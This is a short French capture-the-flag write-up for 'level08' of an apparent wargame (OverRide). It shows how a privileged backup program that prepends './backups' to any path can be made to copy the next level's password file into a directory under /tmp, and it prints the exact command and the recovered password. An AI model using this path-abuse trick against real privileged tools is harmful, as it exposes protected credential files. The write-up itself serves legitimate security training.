### level08

Dans cet exercice, l'exécutable prend en argument un fichier qu'il va lire et sauvegarder dans un dossier backups/.

Naturellement, on lui donne /home/users/level09/.pass :

```bash
level08@OverRide:~$ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

Le problème, c'est qu'il va concaténer './backups' et le filepath qu'on lui donne pour créer le fichier de sauvegarde.
Cependant, il n'y a pas de dossier 'home' dans backups ni les autres sous-dossiers.

Pour remédier à cela, on va exécuter le programme depuis /tmp et créer un dossier backups avec tous les sous-dossiers nécessaires.
Il ne reste plus qu'à lancer le programme et consulter le fichier ainsi créé :

```bash
level08@OverRide:~$ cd /tmp && mkdir -p backups/home/users/level09 && ~/level08 /home/users/level09/.pass && cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```